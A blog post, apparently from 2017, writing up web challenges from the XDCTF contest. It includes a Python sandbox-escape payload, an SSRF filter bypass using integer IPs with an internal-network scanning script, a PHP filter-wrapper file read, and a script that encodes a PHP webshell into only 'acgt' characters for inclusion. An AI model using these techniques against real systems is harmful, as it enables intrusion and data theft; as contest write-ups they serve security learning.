@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta property="og:description" content="">
+    <meta property="og:type" content="website">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        XDCTF web write up - undefined
+        
+    </title>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/aircloud.css">
+
+    
+<link rel="stylesheet" href="/css/gitment.css">
+
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_28hi1hpxx24.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i>  </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/img/avatar.jpeg" />
+        </div>
+        <div class="name">
+            <i>seaii</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li >
+                <a href="/collect/">
+                    <i class="iconfont icon-shoucang1"></i>
+                    <span>COLLECT</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web2"><span class="toc-text">web2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web3"><span class="toc-text">web3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#upload"><span class="toc-text">upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#speech"><span class="toc-text">speech</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-bg" id="search-bg"></div>
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i>  </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        XDCTF web write up
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2017-10-11 19:09:00</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#ctf" title="ctf">ctf</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#write up" title="write up">write up</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <p>国庆在家打了一波xdctf，题目质量挺高的，学到了不少东西。整理了一下web题目，感觉web题的比重越来越小，web狗可能要踏上艰难的转型路了。。。</p>
+<span id="more"></span>
+
+
+<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>python沙盒逃逸，这一篇<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/PLI-yjqmA3gwk5w3KHzOyA">文章</a>介绍的很详细。过滤了os，system，import等关键字，可以通过<code>execfile</code>+编码来绕过过滤。</p>
+<p>os模块的popen函数执行系统命令报错，使用subprocess模块的call函数。</p>
+<p>flag中的l被替换，find找不到，一个一个目录翻的。。。</p>
+<p>payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line">execfile(<span class="string">&#x27;/hfe/yvo/clguba2.7/fhocebprff.cl&#x27;</span>.decode(<span class="string">&#x27;rot13&#x27;</span>))</span><br><span class="line">call(<span class="string">&quot;cat /codes/f1ag_34t6refg812rewfuy&quot;</span>, shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><p>flag页面的URL为<code>http://web.ctf.xidian.edu.cn/web3/?file=flag.html</code>，推测为文件读取。</p>
+<p>将flag.html改为index.php获得源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*//设置open_basedir</span></span><br><span class="line"><span class="comment">ini_set(&quot;open_basedir&quot;, &quot;/home/shawn/www/index/&quot;);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$file</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$file</span> = <span class="string">&quot;main.html&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// disallow ip</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(http:\/\/)+([^\/]+)/i&#x27;</span>, <span class="variable">$file</span>, <span class="variable">$domain</span>)) &#123;</span><br><span class="line">	<span class="variable">$domain</span> = <span class="variable">$domain</span>[<span class="number">2</span>];</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$domain</span>, <span class="string">&quot;.&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;Hacker&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>)!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="comment">/*省略部分*/</span></span><br></pre></td></tr></table></figure>
+
+<p>在这里卡了很久，最后推测是ssrf，通过读取<code>/etc/hosts</code>文件得知内网ip为<code>172.18.0.3</code>。</p>
+<p>由于正则表达式过滤了形如<code>127.0.0.1</code>的ip，使用<strong>整形ip</strong>来代替，扫描内网。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">	ip = <span class="string">&#x27;172.18.0.%d&#x27;</span> % i</span><br><span class="line">	int_ip = <span class="built_in">int</span>(socket.inet_aton(ip).encode(<span class="string">&#x27;hex&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">	<span class="comment">#print int_ip</span></span><br><span class="line">	r = requests.get(<span class="string">&#x27;http://web.ctf.xidian.edu.cn/web3/?file=&#x27;</span>+urllib.quote_plus(<span class="string">&#x27;http://%d&#x27;</span> % int_ip))</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">		<span class="built_in">print</span> ip, int_ip</span><br><span class="line">		<span class="built_in">print</span> r.text</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>172.18.0.2有flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">172.18.0.2 2886860802</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body bgcolor=&quot;white&quot;&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;hr&gt;&lt;center&gt;nginx/1.13.5&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;!-- a padding to disable MSIE and Chrome friendly error page --&gt;</span><br><span class="line">&lt;!-- a padding to disable MSIE and Chrome friendly error page --&gt;</span><br><span class="line">&lt;!-- a padding to disable MSIE and Chrome friendly error page --&gt;</span><br><span class="line">&lt;!-- a padding to disable MSIE and Chrome friendly error page --&gt;</span><br><span class="line">&lt;!-- a padding to disable MSIE and Chrome friendly error page --&gt;</span><br><span class="line">&lt;!-- do u see me? ha flag&#123;0e34c0321b2b3048d399b41a8ffda584&#125; --&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p>page.php存在文件包含漏洞，可以通过php伪协议来读取文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//web.ctf.xidian.edu.cn/web5/page.php?file=php://filter/convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure>
+
+<p>得到page.php和upload.php的源码。</p>
+<p>page.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">@<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data|input|read/i&#x27;</span>, <span class="variable">$file</span>) || <span class="title function_ invoke__">strstr</span>(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>) !== <span class="literal">FALSE</span> ) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; error! &lt;/p&gt;&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>upload.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[file]) &amp;&amp; <span class="variable">$_FILES</span>[file][<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">4</span> ** <span class="number">8</span>) &#123;</span><br><span class="line">	<span class="variable">$d</span> = <span class="string">&quot;./tmp/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">session_id</span>());</span><br><span class="line">	@<span class="title function_ invoke__">mkdir</span>(<span class="variable">$d</span>);</span><br><span class="line">	<span class="variable">$b</span> = <span class="string">&quot;<span class="subst">$d</span>/&quot;</span> . <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_FILES</span>[file][name], <span class="number">8</span>);</span><br><span class="line">	<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$b</span>, <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^acgt]/is&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[file][tmp . <span class="string">&quot;_name&quot;</span>])));</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>page.php没什么好说的，upload.php的正则将不是acgtACGT的字符全部替换为空了。</p>
+<p>一开始的以为是没有使用<code>move_uploaded_file</code>函数，临时文件会有问题，不出意外思路完全偏了（菜的不行，脑洞还挺大。。。）。临时文件在脚本执行结束就直接删除了。也想过从正则入手，还是姿势不够，完全没进展。</p>
+<p><strong>我们需要使用<code>acgtACGT</code>这8个字符来构造一个webshell，然后配合文件包含来使用。</strong></p>
+<p>知识点来了：php的base64解码函数为了提高自己的容错性，如果参数中有非法字符 (不在 base64 的 64 个字符范围内的) 就会跳过。</p>
+<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171005/8Ab8Ec6c0h.png" alt="mark"></p>
+<p>思路是这样的，首先得到acgt的全排列，然后将他们解码，得到的明文必然会出现新的字符，通过这种方法不断扩充可用字符，直到base64编码的64个字符全部可用。</p>
+<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171005/GLIB2694eg.png" alt="mark"></p>
+<p>上面这个例子：<code>acgtacgtacgtacgt</code>的解码结果为<code>&#39;i\xc8-i\xc8-i\xc8-i\xc8-&#39;</code>，里面有可用字符<code>i</code>，由于解码函数的容错性<code>&#39;i\xc8-i\xc8-i\xc8-i\xc8-&#39;</code>的解码结果与<code>iiii</code>是相同的。</p>
+<p>写脚本生成webshell：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">allow_chars = <span class="built_in">set</span>(<span class="string">&#x27;acgt&#x27;</span>)</span><br><span class="line">shell = <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span></span><br><span class="line">base64_chars = string.letters + string.digits + <span class="string">&#x27;+/&#x27;</span> <span class="comment">#base64可用字符集</span></span><br><span class="line">table = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_chars</span>(<span class="params">allow_chars</span>):</span><br><span class="line">    <span class="keyword">global</span> table</span><br><span class="line">    l = <span class="built_in">list</span>(itertools.permutations(allow_chars, <span class="number">4</span>)) <span class="comment">#获取可用字符的全排列    </span></span><br><span class="line">    chars = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> data <span class="keyword">in</span> l:</span><br><span class="line">        data = <span class="string">&#x27;&#x27;</span>.join(data)</span><br><span class="line">        decode_data = data.decode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line">        <span class="comment">#寻找合法字符，用可用字符代替，扩充字符集</span></span><br><span class="line">        counter = <span class="number">0</span></span><br><span class="line">        t = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> decode_data:</span><br><span class="line">            <span class="keyword">if</span> char <span class="keyword">in</span> base64_chars:</span><br><span class="line">                counter += <span class="number">1</span></span><br><span class="line">                t = char </span><br><span class="line">        <span class="keyword">if</span> counter == <span class="number">1</span>:</span><br><span class="line">            chars[t] = data</span><br><span class="line">    table.append(chars)        </span><br><span class="line">    <span class="keyword">return</span> table <span class="keyword">if</span> (<span class="built_in">len</span>(chars.keys()) == <span class="built_in">len</span>(base64_chars)) <span class="keyword">else</span> get_chars(chars.keys())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base64_encode</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> data.encode(<span class="string">&#x27;base64&#x27;</span>).replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#一层层将字符串替换为可用字符</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_encode_shell</span>(<span class="params">data, table</span>):</span><br><span class="line">    data = base64_encode(data)</span><br><span class="line">   	temp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> chs <span class="keyword">in</span> table[::-<span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> data:</span><br><span class="line">            temp += chs[ch]</span><br><span class="line">        data = temp</span><br><span class="line">        temp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: </span><br><span class="line">    dicts = get_chars(allow_chars)</span><br><span class="line">    encode_shell = get_encode_shell(shell, dicts)</span><br><span class="line">    <span class="built_in">print</span> encode_shell</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;shell&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(encode_shell)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;php://filter/convert.base64-decode/resource=&#x27;</span>*(<span class="built_in">len</span>(table) + <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="speech"><a href="#speech" class="headerlink" title="speech"></a>speech</h3><p>时代在进步，社会在发展，web题都和机器学习结合在一起了。。。发给玩机器学习的学长学弟，看了很久也没个结果，只能含泪跳过了。。。</p>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+        <div id="lv-container"></div>
+        <div class="giscus"></div>
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>  Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = ""
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+<script src="/js/index.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+</html>
